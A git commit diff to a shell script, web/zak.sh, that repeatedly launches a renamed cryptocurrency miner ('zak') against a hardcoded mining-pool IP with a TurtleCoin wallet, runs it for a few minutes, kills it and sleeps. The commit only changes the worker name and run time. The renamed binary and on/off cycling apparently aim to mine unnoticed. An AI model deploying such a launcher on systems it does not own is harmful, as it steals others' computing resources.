53b385b36dbe6d5941b0d92be3725c07af9ee9b8
quadrozak <52430413+quadrozak@users.noreply.github.com>
2019-07-02 01:09:50 +0200

    Update zak.sh

--- web/zak.sh
+++ web/zak.sh
@@ -2,8 +2,8 @@ tar -xf zak.tar.xz
 while true
 do
 echo 'i am in'
-nohup ./zak -o 148.100.244.164:2349 --currency cryptonight_turtle -i 0 -r z -u userA -p TRTLv1Hqo3wHdqLRXuCyX3MwvzKyxzwXeBtycnkDy8ceFp4E23bm3P467xLEbUusH6Q1mqQUBiYwJ2yULJbvr5nKe8kcyc4uyps+bf7d5b36d5da9c403d32eb5f3b5c1319d4613de7c11090b73eb2adefebd0d7db@Hero &
-sleep 120
+nohup ./zak -o 148.100.244.164:2349 --currency cryptonight_turtle -i 0 -r z -u userA -p TRTLv1Hqo3wHdqLRXuCyX3MwvzKyxzwXeBtycnkDy8ceFp4E23bm3P467xLEbUusH6Q1mqQUBiYwJ2yULJbvr5nKe8kcyc4uyps+bf7d5b36d5da9c403d32eb5f3b5c1319d4613de7c11090b73eb2adefebd0d7db@Heroquadro &
+sleep 180
 echo 'i am out'
 kill -9 $(pgrep zak)
 sleep 30
